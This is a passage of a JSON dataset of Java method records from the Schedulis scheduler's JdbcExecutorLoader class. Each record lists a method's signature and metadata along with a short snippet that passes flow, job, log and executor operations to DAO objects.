["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchFlowHistory(final String projContain,\n                                               final String flowContains,\n                                               final String execIdContain,\n                                               final String userNameContains, final String status,\n                                               final long startTime,\n                                               final long endTime, final int skip, final int num, final int flowType)\n                                               throws ExecutorManagerException {\n    return this.executionFlowDao.fetchFlowHistory(projContain, flowContains,execIdContain,\n        userNameContains, status, startTime, endTime, skip, num, flowType);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31578, "method_name": "fetchMaintainedFlowHistory", "class_name": "JdbcExecutorLoader", "params": ["String", "String", "String", "String", "String", "long", "long", "int", "int", "int", "String", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchMaintainedFlowHistory(String projContain, String flowContains,\n                                                  String execIdContain, String userNameContains, String status, long startTime,\n                                                  long endTime, int skip, int num, int flowType, String username, List<Integer> projectIds)\n          throws ExecutorManagerException {\n    return this.executionFlowDao.fetchMaintainedFlowHistory(projContain, flowContains,execIdContain,\n            userNameContains, status, startTime, endTime, skip, num, flowType, username, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31579, "method_name": "fetchFlowHistoryQuickSearch", "class_name": "JdbcExecutorLoader", "params": ["String", "String", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchFlowHistoryQuickSearch(final String searchContains,\n      final String userNameContains, final int skip, final int num) throws ExecutorManagerException {\n    return this.executionFlowDao.fetchFlowHistoryQuickSearch(searchContains, userNameContains, skip, num);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31580, "method_name": "fetchFlowHistoryQuickSearch", "class_name": "JdbcExecutorLoader", "params": ["String", "String", "int", "int", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchFlowHistoryQuickSearch(final String searchContains,\n                                                          final String username,\n                                                          final int skip, final int num,\n                                                          List<Integer> projectIds) throws ExecutorManagerException {\n    return this.executionFlowDao.fetchFlowHistoryQuickSearch(searchContains, username, skip, num, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31581, "method_name": "fetchFlowAllHistory", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchFlowAllHistory(int projectId, String flowId, String user)\n      throws ExecutorManagerException{\n    return this.executionFlowDao.fetchFlowAllHistory(projectId, flowId, user);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31582, "method_name": "addActiveExecutableReference", "class_name": "JdbcExecutorLoader", "params": ["ExecutionReference"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void addActiveExecutableReference(final ExecutionReference reference)\n      throws ExecutorManagerException {\n\n    this.activeExecutingFlowsDao.addActiveExecutableReference(reference);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31583, "method_name": "removeActiveExecutableReference", "class_name": "JdbcExecutorLoader", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void removeActiveExecutableReference(final int execid)\n      throws ExecutorManagerException {\n\n    this.activeExecutingFlowsDao.removeActiveExecutableReference(execid);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31584, "method_name": "updateExecutableReference", "class_name": "JdbcExecutorLoader", "params": ["int", "long"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean updateExecutableReference(final int execId, final long updateTime)\n      throws ExecutorManagerException {\n\n    // Should be 1.\n    return this.activeExecutingFlowsDao.updateExecutableReference(execId, updateTime);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31585, "method_name": "uploadExecutableNode", "class_name": "JdbcExecutorLoader", "params": ["ExecutableNode", "Props"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void uploadExecutableNode(final ExecutableNode node, final Props inputProps)\n      throws ExecutorManagerException {\n\n    this.executionJobDao.uploadExecutableNode(node, inputProps);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31586, "method_name": "updateExecutableNode", "class_name": "JdbcExecutorLoader", "params": ["ExecutableNode"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateExecutableNode(final ExecutableNode node)\n      throws ExecutorManagerException {\n\n    this.executionJobDao.updateExecutableNode(node);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31587, "method_name": "fetchJobInfoAttempts", "class_name": "JdbcExecutorLoader", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableJobInfo>", "snippet": "  public List<ExecutableJobInfo> fetchJobInfoAttempts(final int execId, final String jobId)\n      throws ExecutorManagerException {\n\n    return this.executionJobDao.fetchJobInfoAttempts(execId, jobId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31588, "method_name": "fetchJobInfo", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutableJobInfo", "snippet": "  public ExecutableJobInfo fetchJobInfo(final int execId, final String jobId, final int attempts)\n      throws ExecutorManagerException {\n\n    return this.executionJobDao.fetchJobInfo(execId, jobId, attempts);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31589, "method_name": "fetchExecutionJobInputProps", "class_name": "JdbcExecutorLoader", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props fetchExecutionJobInputProps(final int execId, final String jobId)\n      throws ExecutorManagerException {\n    return this.executionJobDao.fetchExecutionJobInputProps(execId, jobId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31590, "method_name": "fetchExecutionJobOutputProps", "class_name": "JdbcExecutorLoader", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props fetchExecutionJobOutputProps(final int execId, final String jobId)\n      throws ExecutorManagerException {\n    return this.executionJobDao.fetchExecutionJobOutputProps(execId, jobId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31591, "method_name": "fetchExecutionJobProps", "class_name": "JdbcExecutorLoader", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Pair<Props,Props>", "snippet": "  public Pair<Props, Props> fetchExecutionJobProps(final int execId, final String jobId)\n      throws ExecutorManagerException {\n    return this.executionJobDao.fetchExecutionJobProps(execId, jobId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31592, "method_name": "fetchJobHistory", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableJobInfo>", "snippet": "  public List<ExecutableJobInfo> fetchJobHistory(final int projectId, final String jobId,\n      final int skip, final int size)\n      throws ExecutorManagerException {\n\n    return this.executionJobDao.fetchJobHistory(projectId, jobId, skip, size);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31593, "method_name": "fetchJobAllHistory", "class_name": "JdbcExecutorLoader", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableJobInfo>", "snippet": "  public List<ExecutableJobInfo> fetchJobAllHistory(final int projectId, final String jobId)\n      throws ExecutorManagerException {\n\n    return this.executionJobDao.fetchJobAllHistory(projectId, jobId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31594, "method_name": "getJobLogOffset", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int", "Long"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getJobLogOffset(int execId, String jobName, int attempt, Long length) throws ExecutorManagerException {\n    Long maxSize = this.executionLogsDao.getJobLogMaxSize(execId, jobName, attempt);\n    return maxSize - length > 0? maxSize - length: 0;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31595, "method_name": "fetchLogs", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "LogData", "snippet": "  public LogData fetchLogs(final int execId, final String name, final int attempt,\n      final int startByte,\n      final int length) throws ExecutorManagerException {\n\n    return this.executionLogsDao.fetchLogs(execId, name, attempt, startByte, length);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31596, "method_name": "fetchAttachments", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<Object>", "snippet": "  public List<Object> fetchAttachments(final int execId, final String jobId, final int attempt)\n      throws ExecutorManagerException {\n\n    return this.executionJobDao.fetchAttachments(execId, jobId, attempt);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31597, "method_name": "uploadLogFile", "class_name": "JdbcExecutorLoader", "params": ["int", "String", "int", "File"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void uploadLogFile(final int execId, final String name, final int attempt,\n      final File... files)\n      throws ExecutorManagerException {\n    this.executionLogsDao.uploadLogFile(execId, name, attempt, files);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31598, "method_name": "uploadAttachmentFile", "class_name": "JdbcExecutorLoader", "params": ["ExecutableNode", "File"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void uploadAttachmentFile(final ExecutableNode node, final File file)\n      throws ExecutorManagerException {\n    this.executionJobDao.uploadAttachmentFile(node, file);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31599, "method_name": "fetchAllExecutors", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<Executor>", "snippet": "  public List<Executor> fetchAllExecutors() throws ExecutorManagerException {\n    return this.executorDao.fetchAllExecutors();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31600, "method_name": "fetchActiveExecutors", "class_name": "JdbcExecutorLoader", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<Executor>", "snippet": "  public List<Executor> fetchActiveExecutors() throws ExecutorManagerException {\n    return this.executorDao.fetchActiveExecutors();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31601, "method_name": "fetchExecutor", "class_name": "JdbcExecutorLoader", "params": ["String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Executor", "snippet": "  public Executor fetchExecutor(final String host, final int port)\n      throws ExecutorManagerException {\n    return this.executorDao.fetchExecutor(host, port);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31602, "method_name": "fetchExecutor", "class_name": "JdbcExecutorLoader", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Executor", "snippet": "  public Executor fetchExecutor(final int executorId) throws ExecutorManagerException {\n    return this.executorDao.fetchExecutor(executorId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31603, "method_name": "updateExecutor", "class_name": "JdbcExecutorLoader", "params": ["Executor"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateExecutor(final Executor executor) throws ExecutorManagerException {\n    this.executorDao.updateExecutor(executor);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31604, "method_name": "addExecutor", "class_name": "JdbcExecutorLoader", "params": ["String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Executor", "snippet": "  public Executor addExecutor(final String host, final int port)\n      throws ExecutorManagerException {\n    return this.executorDao.addExecutor(host, port);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31605, "method_name": "removeExecutor", "class_name": "JdbcExecutorLoader", "params": ["String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void removeExecutor(final String host, final int port) throws ExecutorManagerException {\n    this.executorDao.removeExecutor(host, port);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31606, "method_name": "postExecutorEvent", "class_name": "JdbcExecutorLoader", "params": ["Executor", "EventType", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void postExecutorEvent(final Executor executor, final EventType type, final String user,\n      final String message) throws ExecutorManagerException {\n\n    this.executorEventsDao.postExecutorEvent(executor, type, user, message);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31607, "method_name": "getExecutorEvents", "class_name": "JdbcExecutorLoader", "params": ["Executor", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutorLogEvent>", "snippet": "  public List<ExecutorLogEvent> getExecutorEvents(final Executor executor, final int num,\n      final int offset) throws ExecutorManagerException {\n    return this.executorEventsDao.getExecutorEvents(executor, num, offset);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31608, "method_name": "assignExecutor", "class_name": "JdbcExecutorLoader", "params": ["int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void assignExecutor(final int executorId, final int executionId)\n      throws ExecutorManagerException {\n    this.assignExecutorDao.assignExecutor(executorId, executionId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31609, "method_name": "fetchExecutorByExecutionId", "class_name": "JdbcExecutorLoader", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Executor", "snippet": "  public Executor fetchExecutorByExecutionId(final int executionId)\n      throws ExecutorManagerException {\n    return this.executorDao.fetchExecutorByExecutionId(executionId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31610, "method_name": "removeExecutionLogsByTime", "class_name": "JdbcExecutorLoader", "params": ["long"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int removeExecutionLogsByTime(final long millis)\n      throws ExecutorManagerException {\n    return this.executionLogsDao.removeExecutionLogsByTime(millis);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31611, "method_name": "unassignExecutor", "class_name": "JdbcExecutorLoader", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void unassignExecutor(final int executionId) throws ExecutorManagerException {\n    this.assignExecutorDao.unassignExecutor(executionId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31612, "method_name": "selectAndUpdateExecution", "class_name": "JdbcExecutorLoader", "params": ["int", "boolean"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int selectAndUpdateExecution(final int executorId, final boolean isActive)\n      throws ExecutorManagerException {\n\t      return this.executionFlowDao.selectAndUpdateExecution(executorId, isActive);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31613, "method_name": "unsetExecutorIdForExecution", "class_name": "JdbcExecutorLoader", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void unsetExecutorIdForExecution(final int executionId) throws ExecutorManagerException {\n    this.executionFlowDao.unsetExecutorIdForExecution(executionId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31614, "method_name": "fetchUserFlowHistory", "class_name": "JdbcExecutorLoader", "params": ["int", "int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchUserFlowHistory(final int skip, final int num, final String user)\n      throws ExecutorManagerException {\n    return this.executionFlowDao.fetchUserFlowHistory(skip, num, user);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31615, "method_name": "fetchUserFlowHistoryByAdvanceFilter", "class_name": "JdbcExecutorLoader", "params": ["String", "String", "String", "String", "String", "long", "long", "int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchUserFlowHistoryByAdvanceFilter(final String projContain,\n      final String flowContains, final String execIdContain, final String userNameContains, final String status, final long startTime,\n      final long endTime, final int skip, final int num, final int flowType) throws ExecutorManagerException {\n    return this.executionFlowDao.fetchUserFlowHistoryByAdvanceFilter(projContain, flowContains,execIdContain,\n        userNameContains, status, startTime, endTime, skip, num, flowType);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31616, "method_name": "fetchHistoryRecoverFlows", "class_name": "JdbcExecutorLoader", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchHistoryRecoverFlows(final String userNameContains)\n      throws ExecutorManagerException {\n    return this.executionFlowDao.fetchHistoryRecoverFlows(userNameContains);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31617, "method_name": "fetchHistoryRecoverFlowByRepeatId", "class_name": "JdbcExecutorLoader", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchHistoryRecoverFlowByRepeatId(final String repeatId)\n      throws ExecutorManagerException {\n    return this.executionFlowDao.fetchHistoryRecoverFlowByRepeatId(repeatId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31618, "method_name": "fetchHistoryRecoverFlowByFlowId", "class_name": "JdbcExecutorLoader", "params": ["String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> fetchHistoryRecoverFlowByFlowId(final String flowId, final String projectId)\n      throws ExecutorManagerException {\n    return this.executionFlowDao.fetchHistoryRecoverFlowByFlowId(flowId, projectId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31619, "method_name": "listHistoryRecoverFlows", "class_name": "JdbcExecutorLoader", "params": ["Map", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionRecover>", "snippet": "  public List<ExecutionRecover> listHistoryRecoverFlows(final Map paramMap, final int skip, final int num)\n      throws ExecutorManagerException{\n    return this.executionRecoverDao.listHistoryRecoverFlows(paramMap, skip, num);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31620, "method_name": "listMaintainedHistoryRecoverFlows", "class_name": "JdbcExecutorLoader", "params": ["String", "List<Integer>", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionRecover>", "snippet": "  public List<ExecutionRecover> listMaintainedHistoryRecoverFlows(String username, List<Integer> projectIds, int skip, int num)\n          throws ExecutorManagerException {\n    return this.executionRecoverDao.listMaintainedHistoryRecoverFlows(username, projectIds, skip, num);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31621, "method_name": "saveHistoryRecoverFlow", "class_name": "JdbcExecutorLoader", "params": ["ExecutionRecover"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer saveHistoryRecoverFlow(final ExecutionRecover executionRecover)\n      throws ExecutorManagerException{\n    return this.executionRecoverDao.uploadExecutableRecoverFlow(executionRecover);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31622, "method_name": "updateHistoryRecover", "class_name": "JdbcExecutorLoader", "params": ["ExecutionRecover"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateHistoryRecover(final ExecutionRecover executionRecover) throws ExecutorManagerException{\n    this.executionRecoverDao.updateExecutableRecoverFlow(executionRecover);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31623, "method_name": "getHistoryRecoverFlow", "class_name": "JdbcExecutorLoader", "params": ["Integer"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutionRecover", "snippet": "  public ExecutionRecover getHistoryRecoverFlow(final Integer recoverId) throws ExecutorManagerException{\n\n    return this.executionRecoverDao.getHistoryRecoverFlows(recoverId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/JdbcExecutorLoader.java", "stars": "18", "class_props": {"extends": null, "implements": ["ExecutorLoader"], "modifiers": ["public"]}}, {"id": 31624, "method_name": "getHistoryRecoverFlowByPidAndFid", "class_name": "JdbcExecutorLoader", "params": ["String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutionRecover", "snippet": "  public ExecutionRecover getHistoryRecoverFlowByPidAndFid(final String projectId, final String flowId)\n      throws ExecutorManagerException{\n\n    return this.executionRecoverDao.getHistoryRecoverFlowByPidAndFid(projectId, flowId);\n  }", "url": 